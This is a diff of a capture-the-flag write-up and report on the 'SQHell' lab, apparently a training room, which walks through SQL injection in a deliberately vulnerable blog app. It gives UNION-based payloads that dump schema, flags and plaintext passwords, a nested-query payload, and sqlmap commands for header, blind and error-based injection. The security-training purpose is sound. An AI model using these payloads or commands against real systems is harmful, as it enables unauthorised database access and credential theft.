@@ -1,8 +1,19 @@
 # SQHell Report 
 
 ## Summary
+This report outlines multiple critical SQL injection vulnerabilities identified across various endpoints of the target web application simulating a blog and user management system. Manual testing and automated tools (such as sqlmap) confirmed that user-controlled inputs are directly injected into SQL statements without proper sanitization. The vulnerabilities allowed for full database compromise, including:
+- extraction of sensitive data such as credentials and application flags,
+- enumeration of databases, tables, and columns,
+- execution of stacked queries in some endpoints.
 
-<span>&nbsp;</span>
+The following endpoints were affected:
+- /post?id= – classic union-based SQL injection,
+- /user?id= – union-based SQL injection,
+- /register/user-check – error- and boolean-based injection,
+- /login – blind SQL injection (time-based, boolean, stacked),
+- /terms-and-conditions – SQL injection via X-Forwarded-For HTTP header.
+
+Multiple databases (sqhell_1 through sqhell_5) were compromised, confirming complete access to the backend environment. Given the range of vectors and depth of access, the overall risk to confidentiality and integrity is critical.
 
 | Risk | Impact | Severity |
 | --- | --- | --- |
@@ -19,9 +30,9 @@ Assessment of multiple endpoints across a vulnerable web application designed to
 
 ## Methodology
 The testing approach included:
-- Manual probing and payload injection via browser
-- HTTP request manipulation using Burp Suite
-- Automated exploitation and enumeration using sqlmap
+- manual probing and payload injection via browser,
+- HTTP request manipulation using Burp Suite,
+- automated exploitation and enumeration using sqlmap.
 
 Focus was placed on discovering SQL injection vulnerabilities through both URL parameters and HTTP headers, identifying database schema and extracting sensitive data.
 <span>&nbsp;</span>
@@ -49,7 +60,6 @@ The target application is a vulnerable web service simulating a basic blog and u
 
 <span>&nbsp;</span>
 
-## Identified Vulnerabilities
 ###  Union-based SQL Injection in `/user?id=`
 - **Vector:** - URL parameter(id).
 
@@ -62,12 +72,11 @@ The target application is a vulnerable web service simulating a basic blog and u
 
 <span>&nbsp;</span>
 
-## Identified Vulnerabilities
 ### Error-based / Boolean-based SQL Injection in `/register/user-check`
 - **Vector:** Query string parameter (username).
 
 - **Proof of Concept**:   
-    ```
+    ```SQL
     sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch --level=3 --risk=3
     ```
 
@@ -80,7 +89,7 @@ The target application is a vulnerable web service simulating a basic blog and u
 - **Vector:** X-Forwarded-For HTTP header.
 
 - **Proof of Concept**:   
-    ```
+    ```SQL
     sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 127.0.0.1*" --dbms=mysql --batch
     ```
 
@@ -88,11 +97,11 @@ The target application is a vulnerable web service simulating a basic blog and u
 
 <span>&nbsp;</span>
 
-### - Blind SQL Injection on /login
+### Blind SQL Injection on /login
 - **Vector:** POST parameters (username).
 
 - **Proof of Concept**:   
-    ```
+    ```SQL
     sqlmap -r request.txt --dbms=mysql --batch --level=3 --risk=3
     ```
 
@@ -103,10 +112,10 @@ The target application is a vulnerable web service simulating a basic blog and u
 ## Walktrough
 At the start there is blog site.  
 
-![alt text](image.png)
+![image](https://github.com/user-attachments/assets/86bd1fda-4606-45f5-9a96-9a4f0b9a992d)
 
 The second blog post is selected for initial testing.
-```BASH
+```SQL
 /post?id=2
 ```
 
@@ -118,23 +127,25 @@ SELECT * from blog where id=2...
 
 Add a single quote after id number to test for SQL injection.
 
-![alt text](image-1.png)
+![image-1](https://github.com/user-attachments/assets/e7348f9f-eea5-43ba-ae08-ae18b10a844f)
 
 This returns an SQL syntax error, confirming that user input is not properly sanitized and is directly inserted into an SQL query. The error message also confirms that the backend database is MySQL.
 
 <span>&nbsp;</span>
 
 Use a UNION SELECT payload to identify how many columns the original query returns. A response with no error indicates there are four columns.
-```BASH
+```SQL
 /post?id=2 UNION SELECT 1,2,3,4
 ```
-![alt text](image-31.png)
+
+![image-31](https://github.com/user-attachments/assets/c2ce63f7-d869-4049-9c3f-1a674af74661)
 
 The next step is to extract database information using built-in MySQL functions such as DATABASE() and VERSION().
-```BASH
+```SQL
 /post?id=-1 UNION SELECT 1,DATABASE(),VERSION(),4- -
 ```  
-![alt text](image-32.png)
+![image-32](https://github.com/user-attachments/assets/973682ec-98b0-4336-aaa7-d27b03f6d1b3)
+
 
 The query reveals that the current database in use is named sqhell_5.
 
@@ -142,83 +153,87 @@ The query reveals that the current database in use is named sqhell_5.
 
 Table information can be retrieved in two ways: manually through injection or using automation tools like sqlmap.
 1. SQL injection via URL:
-```BASH
+```SQL
 /post?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqhell_5'),3,4-- -
 ```
-![alt text](image-33.png) 
 
-```BASH
+![image-33](https://github.com/user-attachments/assets/059a245c-9b14-47a3-be4b-7564c09534f5)
+
+```SQL
 /post?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'),3,4-- -
 ```
-![alt text](image-36.png)
 
-```BASH
+![image-36](https://github.com/user-attachments/assets/35b14111-a045-4332-8d60-c7c0e0af41f3)
+
+```SQL
 /post?id=-1 UNION SELECT 1,(SELECT flag FROM flag LIMIT 0,1),3,4-- -
 ```
-![alt text](image-37.png)
+
+![image-37](https://github.com/user-attachments/assets/1726bfcf-0a3a-4d8c-88f2-b01839516f86)
 
 <span>&nbsp;</span>
 
 2. Use sqlmap
 ```BASH
-sqlmap -u "http://10.10.208.55/post?id=2" --dbms=mysql -D sqhell_5 --tables --batch
+sqlmap -u "http://$ip/post?id=2" --dbms=mysql -D sqhell_5 --tables --batch
 ```
 
-![alt text](image-34.png)
+![image-34](https://github.com/user-attachments/assets/15be73e1-df16-4e08-aea9-dadef8acbf38)
 
 The sqhell_5 database contains three tables: flag, posts, and users. The contents of the flag table are dumped next.
 ```BASH
-sqlmap -u "http://10.10.208.55/post?id=1" -D sqhell_5 -T flag --dump --batch
+sqlmap -u "http://$ip/post?id=1" -D sqhell_5 -T flag --dump --batch
 ```
-![alt text](image-35.png)  
+
+![image-35](https://github.com/user-attachments/assets/9d49d7b9-7c6c-4a99-8a69-847eb763d839)
 
 <span>&nbsp;</span>
 
 A hint in the "Terms and Conditions" page mentions IP logging, suggesting that IP addresses may be stored directly in the database, which is a possible injection point.
 ```BASH
-sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 127.0.0.1*" --dbms=mysql --batch
+sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 127.0.0.1*" --dbms=mysql --batch
 ```
 
-![alt text](image-9.png)  
+![image-9](https://github.com/user-attachments/assets/045f78d5-71cc-45d4-a730-e410f7fc262a)
 
 Since HTTP headers cannot be modified directly via the browser, sqlmap is used to test for injection through the X-Forwarded-For header.
 ``` BASH
-sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T --dbs
+sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T --dbs
 ``` 
 
-![alt text](image-10.png)
+![image-10](https://github.com/user-attachments/assets/783ffe39-1c5d-4240-931f-aac8fe36fb28)
 
 The sqhell_1 schema is then enumerated to identify its tables.
 ``` BASH
-sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 --tables
+sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 --tables
 ``` 
 
 Data is extracted from the flag table within the sqhell_1 database.
 
-![alt text](image-11.png)
+![image-11](https://github.com/user-attachments/assets/4f4f28c0-64a8-4e6c-aa67-4aa08abe7cce)
 
 ``` BASH
-sqlmap -u "http://10.10.171.55/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 -T flag --dump
+sqlmap -u "http://$ip/terms-and-conditions" --headers="X-Forwarded-For: 10.10.199.236*" --dbms=mysql --batch --technique=T -D sqhell_1 -T flag --dump
 ``` 
 
-![alt text](image-12.png)
+![image-12](https://github.com/user-attachments/assets/b11edfd1-11a6-4c7a-b9ef-4ed8b15cdd24)
 
 <span>&nbsp;</span>
 
 The application also includes login and registration functionality. The registration page is checked to verify whether an admin user already exists.
 
-![alt text](image-17.png)  
+![image-17](https://github.com/user-attachments/assets/68b6754a-5be6-4ae5-b214-7db8c39e2312)
 
 This confirms that an admin account is already present in the database. Catch POST request in Burp:  
 
-![alt text](image-18.png)  
+![image-18](https://github.com/user-attachments/assets/b5ba34bf-685e-4be9-82c5-3d61fbdd19ad)
 
 The intercepted login request is saved to a file and used with sqlmap to test the login form for SQL injection.
 ```BASH
 sqlmap -r request.txt --dbms=mysql --batch --level=3 --risk=3
 ```
 
-![alt text](image-19.png)
+![image-19](https://github.com/user-attachments/assets/90e33ad9-3196-4b57-b269-b3662e27f0c7)
 
 The login form is found to be vulnerable to multiple forms of blind SQL injection, including boolean-based, time-based, and stacked queries.
 
@@ -227,95 +242,97 @@ Check for db name:
 sqlmap -r request.txt -p username --dbms=mysql --batch --current-db
 ```  
 
-![alt text](image-20.png)
+![image-20](https://github.com/user-attachments/assets/c5f10744-8060-40d6-81ba-c42bb2d934a0)
 
-![alt text](image-21.png)
+![image-21](https://github.com/user-attachments/assets/23f56076-9e7c-4cec-9b6f-0e6d8f583a88)
 
 The extracted data reveals a users table containing valid user credentials, including plaintext passwords. 
 ```BASH
 sqlmap -r request.txt -p username --dbms=mysql --batch -D sqhell_2 -T users --dump
 ```
-![alt text](image-22.png)
+
+![image-22](https://github.com/user-attachments/assets/3a072cdb-4495-4ed9-aeb9-ff35ed252bfe)
 
 Using the admin credentials, it is possible to log in and access a page containing flag1.  
 
-![alt text](image-23.png)
+![image-23](https://github.com/user-attachments/assets/17c6e1b0-501c-4565-9c59-864068db9668)
 
 Right now we know about sqhell_1, sqhell_2, sqhell_4 and sqhell_5. What about sqhell_3?
 
 Although new registrations are disabled, the application still performs live checks against existing usernames. Exploit user-check directly if possible by sqlmap. 
 ```BASH
-sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch --level=3 --risk=3
+sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch --level=3 --risk=3
 ```
 
-![alt text](image-24.png)
+![image-24](https://github.com/user-attachments/assets/2a21e9dc-c9c4-454f-bde5-e0157a0ac7ae)
 
 The next step is to determine which database is being used by this endpoint.
 ```BASH
-sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch --current-db
+sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch --current-db
 ```
 
-![alt text](image-25.png)
+![image-25](https://github.com/user-attachments/assets/59432ea9-6e1c-4672-bcd6-6f492147eef2)
 
 The active database is identified as sqhell_3, and its tables are enumerated.
 ```BASH
-sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 --tables
+sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 --tables
 ```
 
-![alt text](image-26.png)
+![image-26](https://github.com/user-attachments/assets/624bf835-234e-4c26-a630-8f83498df1fe)
 
 Get flag.
 ```BASH
-sqlmap -u "http://10.10.134.97/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 -T flag --dump
+sqlmap -u "http://$ip/register/user-check?username=*" --dbms=mysql --batch -D sqhell_3 -T flag --dump
 ```
-![alt text](image-27.png)
+
+![image-27](https://github.com/user-attachments/assets/745ef225-5e1d-4a68-8bc1-48bfdc46b7e8)
 
 <span>&nbsp;</span>
 
 The final endpoint of interest is the /user page.
 There are two ways:
 1. SQL injection via URL:
-```BASH
+```SQL
 /user?id=1 UNION SELECT 1,2,3-- -
 ```
-![alt text](image-38.png)
+![image-38](https://github.com/user-attachments/assets/bd4452c8-e92a-42f1-9804-dccb3e4b0c38)
 
-```BASH
+```SQL
 /user?id=-1 UNION SELECT 1,DATABASE(),VERSION()-- -
 ```
-![alt text](image-39.png)
+![image-39](https://github.com/user-attachments/assets/ec876657-0cc7-4491-8342-e0e7bfad9e6a)
 
-```BASH
+```SQL
 /user?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='sqhell_4'),3-- -
 ```
-![alt text](image-41.png)
+![image-41](https://github.com/user-attachments/assets/d4e73468-e2d4-42fe-a661-3d5f1bc06f0d)
 
-```BASH
+```SQL
 /user?id=-1 UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'),3-- -
 ```
-![alt text](image-42.png)
+![image-42](https://github.com/user-attachments/assets/aa91c434-01bf-4a3f-b31c-4f7e6f374dbb)
 
-```BASH
+```SQL
 /user?id=-1 UNION SELECT 1,(SELECT CONCAT(password, ':', username) FROM users LIMIT 0,1),3-- -
 ```
-![alt text](image-43.png)
+![image-43](https://github.com/user-attachments/assets/a89f9e2c-eb1f-4cfd-a966-a6d28037df9a)
 
 <span>&nbsp;</span>
 
 2. Use sqlmap
 sqlmap is used to enumerate tables and extract their contents from the sqhell_4 database. 
 ```BASH
-sqlmap -u "10.10.134.97/user?id=1" --dbms=mysql --batch --current-db
-
-sqlmap -u "10.10.134.97/user?id=1" --dbms=mysql --batch -D sqhell_4 --tables
-
-sqlmap -u "10.10.134.97/user?id=1" --dbms=mysql --batch -D sqhell_4 -T users --dump
+sqlmap -u "$ip/user?id=1" --dbms=mysql --batch --current-db
+sqlmap -u "$ip/user?id=1" --dbms=mysql --batch -D sqhell_4 --tables
+sqlmap -u "$ip/user?id=1" --dbms=mysql --batch -D sqhell_4 -T users --dump
 ```
-![alt text](image-29.png)
+![image-29](https://github.com/user-attachments/assets/b3c2d30d-62d3-4879-af8d-3d2efb5e5220)
+
 
 If the previous methods fail to extract the flag, a crafted payload can be used to retrieve it by injecting a nested query.
-```BASH
-http://10.10.134.97/user?id=2 UNION SELECT "1 UNION SELECT null,flag,null,null from flag",null,null FROM information_schema.tables WHERE table_schema=database()
+```SQL
+/user?id=2 UNION SELECT "1 UNION SELECT null,flag,null,null from flag",null,null FROM information_schema.tables WHERE table_schema=database()
 ```
-![alt text](image-30.png)
+![image-30](https://github.com/user-attachments/assets/fb8c59d2-d7dd-4739-b4c5-b6890ca445bf)
+
 
